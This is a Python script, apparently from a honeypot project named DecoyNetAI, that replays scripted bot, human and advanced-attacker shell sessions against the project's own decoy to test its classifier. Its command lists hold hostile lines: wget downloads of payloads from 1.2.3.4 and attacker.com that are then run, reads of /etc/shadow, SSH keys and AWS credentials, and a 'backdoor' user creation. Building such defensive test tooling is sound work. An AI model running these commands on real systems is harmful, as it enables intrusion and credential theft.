"""
Attacker Simulator — simulates different attacker types against your own DecoyNet.

USE ONLY ON YOUR OWN DECOYNET MACHINE FOR TESTING.

Simulates:
- Bot/scanner behaviour
- Human attacker behaviour
- Advanced attacker behaviour

Shows that strategy engine correctly classifies each type.

Usage: python3 -m evaluation.attacker_simulator --host 127.0.0.1 --port 2222
"""

import sys
import os
import socket
import time
import argparse
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ── Simulated command sets per attacker type ──────────────────────────────────

BOT_COMMANDS = [
    "enable", "system", "shell", "sh", "cat /etc/passwd",
    "cd /tmp", "wget http://1.2.3.4/bot.sh", "chmod 777 bot.sh",
    "./bot.sh", "busybox", "exit"
]

HUMAN_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "hostname",
    "ifconfig",
    "ls -la",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ps aux",
    "netstat -an",
    "cat /root/notes.txt",
    "ls /root/.ssh",
    "cat /root/.ssh/id_rsa",
    "env",
    "history",
    "cat /var/www/html/.env",
    "exit"
]

ADVANCED_COMMANDS = [
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "find / -name '*.env' 2>/dev/null",
    "cat /root/.aws/credentials",
    "cat /var/www/html/.env",
    "mysql -u root -p",
    "wget http://attacker.com/shell.py",
    "python3 shell.py",
    "chmod +x shell.py",
    "crontab -l",
    "useradd -m backdoor",
    "cat /root/backup.sql",
    "tar -czf /tmp/data.tar.gz /var/www/html",
    "exit"
]


class SimpleSSHClient:
    """
    Minimal raw TCP client that speaks the DecoyNet's fake shell protocol.
    Does NOT use paramiko — sends raw text after banner/login.
    """

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"    Connection failed: {e}")
            return False

    def recv_until(self, marker: bytes = b"$", timeout: float = 5.0) -> str:
        self.sock.settimeout(timeout)
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self.sock.recv(1024)
                if not chunk:
                    break
                buf += chunk
                if any(m in buf for m in [b"$ ", b"# ", b"login:", b"Password:", b"assword"]):
                    break
            except socket.timeout:
                break
        return buf.decode("utf-8", errors="replace")

    def send(self, data: str):
        try:
            self.sock.sendall((data + "\n").encode("utf-8"))
        except Exception:
            pass

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def simulate_bot(host: str, port: int, index: int):
    """Fast automated scanner — minimal delay between commands"""
    print(f"\n  [BOT-{index}] Connecting...")
    client = SimpleSSHClient(host, port)
    if not client.connect():
        return

    client.recv_until(b"login:", timeout=5)
    client.send("root")
    client.recv_until(b"assword", timeout=3)
    client.send("root")
    client.recv_until(b"#", timeout=5)

    for cmd in BOT_COMMANDS:
        client.send(cmd)
        time.sleep(0.05)   # Very fast — bot behaviour
        client.recv_until(b"#", timeout=2)

    client.close()
    print(f"  [BOT-{index}] Session complete.")


def simulate_human(host: str, port: int, index: int):
    """Slow human attacker — long pauses between commands"""
    print(f"\n  [HUMAN-{index}] Connecting...")
    client = SimpleSSHClient(host, port)
    if not client.connect():
        return

    client.recv_until(b"login:", timeout=5)
    client.send("admin")
    client.recv_until(b"assword", timeout=3)
    client.send("password123")
    client.recv_until(b"$", timeout=5)

    for cmd in HUMAN_COMMANDS:
        client.send(cmd)
        time.sleep(random_human_delay())
        client.recv_until(b"$", timeout=5)

    client.close()
    print(f"  [HUMAN-{index}] Session complete.")


def simulate_advanced(host: str, port: int, index: int):
    """Advanced attacker — targeted, fast but varied"""
    print(f"\n  [ADVANCED-{index}] Connecting...")
    client = SimpleSSHClient(host, port)
    if not client.connect():
        return

    client.recv_until(b"login:", timeout=5)
    client.send("root")
    client.recv_until(b"assword", timeout=3)
    client.send("P@ssw0rd!")
    client.recv_until(b"#", timeout=5)

    for cmd in ADVANCED_COMMANDS:
        client.send(cmd)
        time.sleep(random_advanced_delay())
        client.recv_until(b"#", timeout=5)

    client.close()
    print(f"  [ADVANCED-{index}] Session complete.")


import random

def random_human_delay() -> float:
    return random.uniform(1.5, 6.0)

def random_advanced_delay() -> float:
    return random.uniform(0.2, 0.8)


def run_simulation(host: str, port: int, n_bots: int, n_humans: int, n_advanced: int):
    print(f"\n{'='*60}")
    print(f"  DecoyNetAI — Attacker Simulator")
    print(f"  Target: {host}:{port}")
    print(f"  Bots: {n_bots} | Humans: {n_humans} | Advanced: {n_advanced}")
    print(f"{'='*60}")

    threads = []

    # Launch bots (concurrent — simulates real botnet)
    print(f"\n[*] Launching {n_bots} bot sessions (concurrent)...")
    for i in range(n_bots):
        t = threading.Thread(target=simulate_bot, args=(host, port, i+1), daemon=True)
        threads.append(t)
        t.start()
        time.sleep(0.1)

    for t in threads:
        t.join(timeout=30)
    threads.clear()

    time.sleep(2)

    # Launch humans (sequential — they take their time)
    print(f"\n[*] Launching {n_humans} human sessions (sequential)...")
    for i in range(n_humans):
        simulate_human(host, port, i+1)
        time.sleep(3)

    time.sleep(2)

    # Launch advanced (sequential)
    print(f"\n[*] Launching {n_advanced} advanced sessions...")
    for i in range(n_advanced):
        simulate_advanced(host, port, i+1)
        time.sleep(5)

    print(f"\n{'='*60}")
    print(f"  Simulation complete.")
    print(f"  Check dashboard at http://{host}:5000")
    print(f"  Check logs/events.json for SIEM output")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DecoyNetAI Attacker Simulator")
    parser.add_argument("--host",     default="127.0.0.1", help="DecoyNet IP")
    parser.add_argument("--port",     default=2222, type=int, help="SSH port")
    parser.add_argument("--bots",     default=5,  type=int, help="Number of bot sessions")
    parser.add_argument("--humans",   default=2,  type=int, help="Number of human sessions")
    parser.add_argument("--advanced", default=1,  type=int, help="Number of advanced sessions")
    args = parser.parse_args()

    run_simulation(args.host, args.port, args.bots, args.humans, args.advanced)
